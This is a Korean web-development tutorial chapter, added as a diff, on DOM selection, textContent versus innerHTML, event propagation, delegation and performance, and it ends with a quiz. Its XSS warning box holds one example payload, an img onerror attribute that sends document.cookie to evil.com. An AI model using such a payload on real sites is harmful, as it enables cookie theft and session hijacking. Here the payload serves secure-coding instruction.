@@ -1,0 +1,471 @@
+<!--desc: 요소 선택과 생성, textContent와 innerHTML의 보안 차이, 이벤트 등록과 전파, 이벤트 위임, DOM 조작 성능까지 다룹니다.-->
+
+<div class="ch-goals">
+<h2>이 챕터에서 배우는 것</h2>
+<ul>
+  <li>요소를 찾고 만들고 넣는 모든 방법</li>
+  <li><b><code>textContent</code>와 <code>innerHTML</code></b> — 보안이 갈리는 지점</li>
+  <li>이벤트 등록과 <b>전파(버블링·캡처링)</b></li>
+  <li><b>이벤트 위임</b> — 리스너 하나로 수백 개 처리하기</li>
+  <li>DOM 조작 성능</li>
+</ul>
+</div>
+
+<p class="ch-meta">읽는 데 약 26분 · React를 쓰더라도 반드시 알아야 합니다</p>
+
+<h2 id="select">요소 선택</h2>
+
+<div class="codeblock">
+<pre><code data-lang="js">document.getElementById("app");            // id 하나. 가장 빠름
+document.querySelector(".card");           // CSS 선택자, 첫 번째 하나
+document.querySelectorAll(".card");        // 모두 (NodeList)
+
+// 요소 안에서 다시 찾기 — 범위를 좁히면 안전하고 빠릅니다
+const card = document.querySelector(".card");
+card.querySelector(".title");
+
+// 관계로 찾기
+card.parentElement;
+card.children;              // 자식 요소들
+card.closest(".container"); // 조상 중 조건에 맞는 가장 가까운 것 — 위임에 유용
+card.nextElementSibling;</code></pre>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">📋</span> NodeList는 배열이 아닙니다</p>
+<div class="codeblock" style="margin:.6em 0 0">
+<pre><code data-lang="js">const items = document.querySelectorAll("li");
+items.forEach(...)          // ✅ forEach는 있습니다
+items.map(...)              // ❌ TypeError — map은 없습니다
+
+[...items].map(...)         // ✅ 배열로 변환
+Array.from(items).map(...)  // ✅ 같은 뜻</code></pre>
+</div>
+<p style="margin-bottom:0">또 <code>querySelectorAll</code>의 결과는 <b>정적</b>입니다.
+이후에 요소가 추가되어도 목록에 반영되지 않습니다.
+반면 <code>getElementsByClassName</code>은 <b>살아 있는(live)</b> 목록이라 자동으로 갱신됩니다.
+헷갈리기 쉬우므로 <b><code>querySelectorAll</code>로 통일</b>하는 편이 낫습니다.</p>
+</div>
+
+<h2 id="content">내용 다루기 — 보안이 갈리는 지점</h2>
+
+<div class="tablewrap">
+<table>
+<thead><tr><th>속성</th><th>동작</th><th>안전한가</th></tr></thead>
+<tbody>
+<tr><td><code>textContent</code></td><td>순수 텍스트로 넣고 읽습니다. 태그도 <b>글자 그대로</b></td><td><b>안전</b> — 기본값으로 쓰세요</td></tr>
+<tr><td><code>innerHTML</code></td><td>문자열을 <b>HTML로 해석</b>합니다</td><td><b>위험</b> — 사용자 입력에 절대 금지</td></tr>
+<tr><td><code>innerText</code></td><td>화면에 <b>보이는</b> 텍스트. CSS를 반영하느라 느립니다</td><td>대체로 <code>textContent</code>가 낫습니다</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">☠️</span> innerHTML이 만드는 XSS</p>
+<div class="codeblock" style="margin:.6em 0 0">
+<pre><code data-lang="js">// 사용자가 댓글에 이렇게 입력했다면
+const comment = '&lt;img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)"&gt;';
+
+element.innerHTML = comment;    // ☠️ 스크립트가 실제로 실행됩니다
+element.textContent = comment;  // ✅ 글자 그대로 표시될 뿐입니다</code></pre>
+</div>
+<p style="margin-bottom:0"><code>&lt;script&gt;</code>만 조심하면 된다고 생각하기 쉽지만,
+<code>innerHTML</code>로 삽입된 <code>&lt;script&gt;</code>는 실행되지 않는 대신
+<b><code>onerror</code>·<code>onload</code> 같은 속성은 실행됩니다.</b>
+막을 수 있다고 자신하지 마세요. <b>사용자 입력에는 <code>textContent</code></b>가 원칙입니다.
+꼭 HTML을 넣어야 한다면 DOMPurify 같은 검증된 라이브러리로 정화해야 합니다(78장).</p>
+</div>
+
+<h2 id="create">요소 만들고 넣기</h2>
+
+<div class="codeblock">
+<pre><code data-lang="js">const li = document.createElement("li");
+li.textContent = "새 항목";
+li.className = "item";
+li.dataset.id = "42";          // data-id="42" 속성이 됩니다
+
+// 넣기
+list.append(li);               // 마지막 자식으로 (여러 개·문자열도 가능)
+list.prepend(li);              // 첫 자식으로
+target.before(li);             // 형제로 앞에
+target.after(li);              // 형제로 뒤에
+list.replaceChildren(li);      // 기존 자식을 전부 교체 (비우기: 인자 없이 호출)
+
+// 제거
+li.remove();</code></pre>
+</div>
+
+<h3 id="attr">속성과 스타일</h3>
+<div class="codeblock">
+<pre><code data-lang="js">// 클래스 — className을 통째로 덮어쓰기보다 classList를 쓰세요
+el.classList.add("active");
+el.classList.remove("hidden");
+el.classList.toggle("open");          // 있으면 빼고 없으면 넣기
+el.classList.toggle("open", isOpen);  // 조건에 따라 명시적으로
+el.classList.contains("active");
+
+// data-* 속성
+el.dataset.userId = "42";      // data-user-id="42"  (카멜케이스 → 하이픈)
+console.log(el.dataset.userId);
+
+// 스타일 — 여러 개면 클래스를 쓰는 편이 낫습니다
+el.style.backgroundColor = "red";     // CSS의 background-color
+el.style.setProperty("--my-var", "10px");   // CSS 변수도 가능
+
+// 속성(attribute) 직접 조작
+el.setAttribute("aria-expanded", "true");
+el.getAttribute("href");</code></pre>
+</div>
+
+<div class="box tip">
+<p class="box-title"><span class="box-ico">🎨</span> 스타일은 클래스로 바꾸세요</p>
+<p style="margin-bottom:0"><code>el.style.xxx</code>를 여러 줄 쓰는 대신 <b>CSS에 상태 클래스를 정의</b>하고
+<code>classList.toggle</code>로 전환하는 것이 낫습니다.
+스타일이 CSS 파일에 모이고, 애니메이션·미디어 쿼리·다크 모드와도 잘 어울립니다.</p>
+</div>
+
+<h2 id="events">이벤트</h2>
+
+<div class="codeblock">
+<pre><code data-lang="js">button.addEventListener("click", handleClick);
+
+// 옵션
+element.addEventListener("click", fn, {
+  once: true,      // 한 번만 실행하고 자동 제거
+  capture: true,   // 캡처 단계에서 처리 (아래 참고)
+  passive: true,   // preventDefault를 쓰지 않겠다고 약속 → 스크롤 성능 향상
+  signal: controller.signal   // AbortController로 한꺼번에 제거
+});
+
+// 제거하려면 '같은 함수 참조'가 필요합니다
+element.removeEventListener("click", handleClick);
+element.removeEventListener("click", () =&gt; {});   // ❌ 다른 함수라 제거 안 됨</code></pre>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">📜</span> 스크롤 이벤트에는 <code>passive: true</code></p>
+<p style="margin-bottom:0">브라우저는 <code>touchstart</code>·<code>wheel</code> 핸들러가
+<code>preventDefault()</code>를 호출할지 모르기 때문에 <b>핸들러가 끝날 때까지 스크롤을 미룹니다.</b>
+<code>passive: true</code>는 "안 쓸 것"이라는 약속이라, 브라우저가 <b>즉시 스크롤을 진행</b>합니다.
+모바일 스크롤 버벅임의 흔한 원인입니다.</p>
+</div>
+
+<h3 id="propagation">전파 — 캡처링과 버블링</h3>
+
+<div class="codeblock">
+<span class="cb-label">이벤트가 지나가는 길</span>
+<pre><code data-lang="text">        window
+          │  ① 캡처링 (위 → 아래)
+        document
+          │
+         body
+          │
+        div.card
+          │
+        button      ② 타깃
+          │
+        div.card
+          │  ③ 버블링 (아래 → 위)  ← 기본적으로 여기서 처리됩니다
+         body
+          │
+        document</code></pre>
+</div>
+
+<div class="runner" data-lang="html" data-title="전파 직접 보기" data-note="가장 안쪽 버튼을 눌러 순서를 확인하세요. 체크박스로 전파를 멈춰 보세요.">
+<textarea class="rn-src">
+<style>
+  body { font-size: 13px; }
+  .outer { padding: 20px; background: #d5e8e0; border-radius: 10px; }
+  .middle { padding: 20px; background: #a8d5c6; border-radius: 8px; }
+  button { padding: 10px 16px; font-size: 13px; cursor: pointer;
+           border: 0; border-radius: 6px; background: #1f5f4f; color: white; }
+  #log { margin-top: 12px; font-family: monospace; font-size: 11px;
+         background: #f4f4f2; padding: 10px; border-radius: 6px; min-height: 40px; }
+  label { display: block; margin-top: 10px; }
+</style>
+
+<div class="outer" id="outer">
+  outer
+  <div class="middle" id="middle">
+    middle
+    <button id="btn">클릭</button>
+  </div>
+</div>
+
+<label><input type="checkbox" id="stop"> 버튼에서 stopPropagation() 호출</label>
+<div id="log"></div>
+
+<script>
+  const log = document.getElementById("log");
+  function write(text) {
+    log.innerHTML += text + "<br>";   // 데모용. 사용자 입력이 아니므로 안전합니다
+    console.log(text);
+  }
+
+  // 캡처 단계 (내려가는 길)
+  ["outer", "middle"].forEach(id => {
+    document.getElementById(id).addEventListener("click", () => {
+      write("↓ 캡처: " + id);
+    }, { capture: true });
+  });
+
+  // 버블 단계 (올라가는 길) — 기본값
+  ["outer", "middle"].forEach(id => {
+    document.getElementById(id).addEventListener("click", () => {
+      write("↑ 버블: " + id);
+    });
+  });
+
+  document.getElementById("btn").addEventListener("click", (event) => {
+    write("● 타깃: button");
+    write("  target = " + event.target.id);
+    write("  currentTarget = " + event.currentTarget.id);
+    if (document.getElementById("stop").checked) {
+      event.stopPropagation();
+      write("  ✋ stopPropagation() — 위로 올라가지 않습니다");
+    }
+  });
+
+  document.getElementById("outer").addEventListener("click", () => {
+    write("─────");
+  });
+</script>
+</textarea>
+</div>
+
+<div class="tablewrap">
+<table>
+<thead><tr><th>메서드</th><th>하는 일</th></tr></thead>
+<tbody>
+<tr><td><code>event.preventDefault()</code></td><td><b>브라우저 기본 동작</b>을 막습니다. 링크 이동, 폼 제출, 체크박스 토글 등</td></tr>
+<tr><td><code>event.stopPropagation()</code></td><td><b>전파를 멈춥니다.</b> 부모의 핸들러가 실행되지 않습니다</td></tr>
+<tr><td><code>event.stopImmediatePropagation()</code></td><td>같은 요소의 <b>다른 핸들러까지</b> 막습니다</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">✋</span> <code>stopPropagation()</code>을 함부로 쓰지 마세요</p>
+<p style="margin-bottom:0">"드롭다운이 바로 닫혀서" 같은 이유로 습관적으로 넣는 경우가 많은데,
+<b>바깥에서 문서 전체를 감시하던 다른 기능들이 조용히 망가집니다.</b>
+(바깥 클릭 감지, 분석 도구, 접근성 스크립트 등)
+대부분은 <code>event.target</code>을 검사하거나 <code>closest()</code>를 쓰는 것으로 해결됩니다.</p>
+</div>
+
+<h2 id="delegation">이벤트 위임</h2>
+
+<p>목록 항목 1000개에 리스너를 1000개 붙이는 대신,
+<b>부모 하나에만 붙이고 <code>event.target</code>으로 판별</b>하는 기법입니다.</p>
+
+<div class="runner" data-lang="html" data-title="이벤트 위임" data-note="새로 추가한 항목에도 삭제 버튼이 바로 동작합니다. 리스너를 다시 붙이지 않았는데도요.">
+<textarea class="rn-src">
+<style>
+  body { font-size: 13px; }
+  ul { list-style: none; padding: 0; }
+  li { display: flex; align-items: center; gap: 8px;
+       padding: 8px 10px; background: #f4f4f2; margin-bottom: 6px; border-radius: 6px; }
+  li.done span { text-decoration: line-through; color: #999; }
+  li span { flex: 1; }
+  button { padding: 4px 10px; font-size: 12px; cursor: pointer;
+           border: 1px solid #ccc; border-radius: 5px; background: white; }
+  #add { background: #1f5f4f; color: white; border: 0; padding: 8px 14px; }
+</style>
+
+<ul id="list">
+  <li data-id="1"><span>우유 사기</span>
+    <button data-action="toggle">완료</button>
+    <button data-action="delete">삭제</button></li>
+  <li data-id="2"><span>책 읽기</span>
+    <button data-action="toggle">완료</button>
+    <button data-action="delete">삭제</button></li>
+</ul>
+<button id="add">항목 추가</button>
+
+<script>
+  const list = document.getElementById("list");
+  let nextId = 3;
+
+  // ✅ 리스너는 부모에 딱 하나
+  list.addEventListener("click", (event) => {
+    // 클릭된 것이 버튼인지, 어떤 동작인지 확인
+    const button = event.target.closest("button[data-action]");
+    if (!button) return;               // 버튼이 아니면 무시
+
+    const item = button.closest("li");
+    const action = button.dataset.action;
+
+    if (action === "delete") {
+      console.log("삭제:", item.dataset.id);
+      item.remove();
+    } else if (action === "toggle") {
+      item.classList.toggle("done");
+      console.log("토글:", item.dataset.id);
+    }
+  });
+
+  document.getElementById("add").addEventListener("click", () => {
+    const li = document.createElement("li");
+    li.dataset.id = String(nextId);
+    // textContent로 안전하게 텍스트만 넣습니다
+    const span = document.createElement("span");
+    span.textContent = "새 할 일 " + nextId;
+
+    const toggle = document.createElement("button");
+    toggle.dataset.action = "toggle";
+    toggle.textContent = "완료";
+
+    const del = document.createElement("button");
+    del.dataset.action = "delete";
+    del.textContent = "삭제";
+
+    li.append(span, toggle, del);
+    list.append(li);
+    nextId++;
+    console.log("추가됨 — 리스너를 새로 붙이지 않았습니다");
+  });
+</script>
+</textarea>
+</div>
+
+<div class="box tip">
+<p class="box-title"><span class="box-ico">🎯</span> 위임의 세 가지 이득</p>
+<ol style="margin-bottom:0">
+<li><b>메모리</b> — 리스너가 1000개에서 1개로.</li>
+<li><b>동적 요소</b> — 나중에 추가된 요소도 <b>자동으로</b> 동작합니다. 이것이 가장 큰 이점입니다.</li>
+<li><b>정리</b> — 요소를 지울 때 리스너를 따로 제거할 필요가 없습니다.</li>
+</ol>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">🎯</span> <code>closest()</code>가 핵심입니다</p>
+<p style="margin-bottom:0">버튼 안에 아이콘이 있으면 <code>event.target</code>이 <b>아이콘</b>일 수 있습니다.
+<code>event.target.closest("button")</code>은 <b>자기 자신부터 위로 올라가며</b> 조건에 맞는 요소를 찾아 주므로
+어디를 눌러도 올바른 버튼을 얻습니다.</p>
+</div>
+
+<h2 id="perf">DOM 조작 성능</h2>
+
+<div class="codeblock">
+<pre><code data-lang="js">// ❌ 1000번 DOM에 접근 — 매번 레이아웃 계산이 일어날 수 있습니다
+for (let i = 0; i &lt; 1000; i++) {
+  list.append(createItem(i));
+}
+
+// ✅ 메모리에서 다 만든 뒤 한 번에 넣기
+const fragment = document.createDocumentFragment();
+for (let i = 0; i &lt; 1000; i++) {
+  fragment.append(createItem(i));
+}
+list.append(fragment);   // DOM 접근 1회</code></pre>
+</div>
+
+<div class="box warn">
+<p class="box-title"><span class="box-ico">📐</span> 레이아웃 스래싱</p>
+<div class="codeblock" style="margin:.6em 0 0">
+<pre><code data-lang="js">// ❌ 읽기와 쓰기를 번갈아 하면 매번 강제로 레이아웃을 다시 계산합니다
+for (const el of elements) {
+  el.style.height = el.offsetHeight + 10 + "px";   // 쓰기 → 읽기 → 쓰기 …
+}
+
+// ✅ 읽기를 먼저 모두, 그다음 쓰기를 모두
+const heights = elements.map(el =&gt; el.offsetHeight);      // 읽기만
+elements.forEach((el, i) =&gt; el.style.height = heights[i] + 10 + "px");  // 쓰기만</code></pre>
+</div>
+<p style="margin-bottom:0"><code>offsetHeight</code>·<code>getBoundingClientRect()</code>처럼
+<b>계산된 값을 읽는 속성</b>은 브라우저가 <b>지금 즉시 레이아웃을 확정</b>하게 만듭니다.
+쓰기 직후에 읽으면 그 계산이 매번 반복되어 심각하게 느려집니다.</p>
+</div>
+
+<div class="box field">
+<p class="box-title"><span class="box-ico">🛠️</span> 현장 노트 — React를 쓸 거라면 이걸 왜 배우나</p>
+<p style="margin-bottom:0">React는 DOM을 직접 조작하지 말라고 합니다. 그런데도 이 챕터가 필요한 이유는:</p>
+<ul style="margin-bottom:0">
+<li><b>React도 결국 이 API를 씁니다.</b> 원리를 알아야 이상 동작을 설명할 수 있습니다.</li>
+<li><b>이벤트 전파·위임은 React에서도 그대로</b> 적용됩니다.</li>
+<li>포커스 이동, 스크롤 위치, 외부 라이브러리 연동은 <b><code>ref</code>로 직접 DOM을 다뤄야</b> 합니다(64장).</li>
+<li><code>textContent</code>와 <code>innerHTML</code>의 차이는 React의 <code>dangerouslySetInnerHTML</code>이 왜 그런 이름인지 설명해 줍니다.</li>
+</ul>
+</div>
+
+<div class="box recap">
+<p class="box-title"><span class="box-ico">📌</span> 요약</p>
+<ul style="margin-bottom:0">
+<li><code>querySelectorAll</code>은 <b>정적 NodeList</b>. 배열 메서드를 쓰려면 <code>[...list]</code>.</li>
+<li><b>사용자 입력은 <code>textContent</code>.</b> <code>innerHTML</code>은 XSS의 통로다.</li>
+<li>스타일은 <code>el.style</code>보다 <b><code>classList</code></b>로 전환한다.</li>
+<li>리스너 제거에는 <b>같은 함수 참조</b>가 필요하다.</li>
+<li>스크롤·터치 핸들러에는 <b><code>passive: true</code></b>.</li>
+<li>전파는 <b>캡처 → 타깃 → 버블</b>. <code>stopPropagation()</code>은 신중히.</li>
+<li><b>이벤트 위임</b> + <code>closest()</code>가 동적 목록의 정석이다.</li>
+<li>대량 삽입은 <code>DocumentFragment</code>. <b>읽기와 쓰기를 번갈아 하지 않는다.</b></li>
+</ul>
+</div>
+
+<h2 id="refs">참고 자료</h2>
+<ul>
+<li><a href="https://developer.mozilla.org/ko/docs/Web/API/Document_Object_Model/Introduction" target="_blank" rel="noopener">MDN — DOM 소개</a></li>
+<li><a href="https://developer.mozilla.org/ko/docs/Web/API/EventTarget/addEventListener" target="_blank" rel="noopener">MDN — addEventListener</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Event_bubbling" target="_blank" rel="noopener">MDN — 이벤트 버블링과 위임</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/closest" target="_blank" rel="noopener">MDN — closest()</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent" target="_blank" rel="noopener">MDN — textContent (innerHTML과의 차이 설명 포함)</a></li>
+</ul>
+
+<script data-quiz>
+FB_QUIZ([
+  {
+    q: "사용자가 입력한 댓글을 화면에 표시할 때 <code>innerHTML</code> 대신 <code>textContent</code>를 써야 하는 이유는?",
+    o: [
+      "innerHTML이 더 느려서",
+      "innerHTML은 문자열을 HTML로 해석하므로 <code>&lt;img onerror=…&gt;</code> 같은 입력이 실제 코드로 실행되는 XSS 취약점이 생기기 때문",
+      "textContent가 줄바꿈을 지원해서",
+      "innerHTML은 구형 브라우저에서 동작하지 않아서"
+    ],
+    a: 1,
+    e: "<code>innerHTML</code>은 문자열을 <b>마크업으로 파싱</b>합니다. <code>&lt;script&gt;</code>는 실행되지 않지만 <code>onerror</code>·<code>onload</code> 같은 이벤트 속성은 실행되어 쿠키 탈취 등이 가능합니다. <code>textContent</code>는 무조건 글자로만 취급하므로 안전합니다."
+  },
+  {
+    q: "이벤트 위임을 쓰는 가장 큰 실용적 이점은?",
+    o: [
+      "코드가 짧아진다",
+      "나중에 동적으로 추가된 요소에도 리스너를 다시 붙이지 않고 자동으로 동작한다",
+      "이벤트가 더 빨리 발생한다",
+      "preventDefault를 쓸 수 있다"
+    ],
+    a: 1,
+    e: "메모리 절약도 이점이지만 실무에서 결정적인 것은 <b>동적 요소 대응</b>입니다. 부모에 리스너 하나만 있으면 자식이 언제 추가·삭제되든 그대로 동작합니다. 판별에는 <code>event.target.closest(...)</code>를 씁니다."
+  },
+  {
+    q: "<code>document.querySelectorAll(\"li\").map(...)</code> 가 오류를 내는 이유는?",
+    o: [
+      "li 요소가 없어서",
+      "반환값이 NodeList이며 배열이 아니라 map 메서드가 없기 때문. <code>[...list]</code>나 <code>Array.from()</code>으로 변환해야 한다",
+      "querySelectorAll은 문자열을 반환해서",
+      "map은 DOM에서 쓸 수 없어서"
+    ],
+    a: 1,
+    e: "NodeList는 배열과 비슷하지만 <b>배열이 아닙니다</b>. <code>forEach</code>는 있지만 <code>map</code>·<code>filter</code>·<code>reduce</code>는 없습니다. 전개 구문이나 <code>Array.from()</code>으로 진짜 배열로 바꿔야 합니다."
+  },
+  {
+    q: "드롭다운이 바로 닫히는 문제를 <code>stopPropagation()</code>으로 해결하는 것이 위험한 이유는?",
+    o: [
+      "성능이 나빠져서",
+      "문서 전체를 감시하던 다른 기능들(바깥 클릭 감지, 분석 도구, 접근성 스크립트)이 조용히 망가지기 때문",
+      "구형 브라우저에서 지원되지 않아서",
+      "preventDefault와 함께 쓸 수 없어서"
+    ],
+    a: 1,
+    e: "<code>stopPropagation()</code>은 그 이벤트가 <b>위로 올라가는 길을 끊습니다</b>. 내 문제는 해결되지만 상위에서 이벤트를 기다리던 다른 코드는 아무 신호도 받지 못합니다. 대개 <code>event.target</code> 검사나 <code>closest()</code>로 해결하는 편이 안전합니다."
+  },
+  {
+    q: "반복문에서 <code>el.style.height = el.offsetHeight + 10 + \"px\"</code> 를 실행하면 느려지는 이유는?",
+    o: [
+      "px 단위 계산이 무거워서",
+      "쓰기 직후에 계산된 값을 읽으면 브라우저가 그때마다 레이아웃을 강제로 다시 계산하기 때문(레이아웃 스래싱)",
+      "style 속성이 원래 느려서",
+      "반복문 자체가 느려서"
+    ],
+    a: 1,
+    e: "<code>offsetHeight</code>·<code>getBoundingClientRect()</code>는 <b>최신 레이아웃 값</b>을 요구하므로, 직전에 스타일을 바꿨다면 브라우저가 <b>즉시 레이아웃을 다시 계산</b>합니다. 읽기를 모두 먼저 하고 쓰기를 모아서 하면 이 반복을 없앨 수 있습니다."
+  }
+]);
+</script>
